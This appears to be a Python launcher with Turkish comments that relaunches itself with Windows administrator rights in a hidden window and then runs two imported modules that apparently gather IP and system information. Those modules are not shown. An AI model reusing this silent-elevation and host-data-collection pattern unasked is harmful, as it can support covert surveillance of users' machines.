import threading
import time
import sys
import os
import ctypes

# Scraper'ları import et
import utils.ipdata as ipdata
import utils.msinfo as msinfo

def is_admin():
    """Yönetici yetkilerini kontrol et"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Scripti yönetici olarak yeniden çalıştır"""
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:])
            
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                params, 
                None, 
                0  # SW_HIDE
            )
            
            if ret <= 32:  # Error codes
                raise Exception(f"ShellExecute failed with code {ret}")
                
            sys.exit(0)
        except Exception as e:
            print(f"Hata: Yönetici izinleri alınamadı - {e}")
            time.sleep(3)  # Hata mesajını görmek için bekle
            sys.exit(1)

def run_scraper(func):
    """Thread içinde scraper'ı çalıştır"""
    result = [None]
    
    def wrapper():
        result[0] = func()
    
    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout=300)  # 5 dakika timeout
    
    # Eğer hala çalışıyorsa bekle
    while thread.is_alive():
        time.sleep(1)
    
    return result[0]

def main():
    # Yönetici izinlerini kontrol et
    run_as_admin()
    
    # Yönetici izinleri alındı, scraper'ları çalıştır
    ipdata_result = run_scraper(ipdata.run_ipdata)
    msinfo_result = run_scraper(msinfo.run_msinfo_scraper)

if __name__ == "__main__":
    main()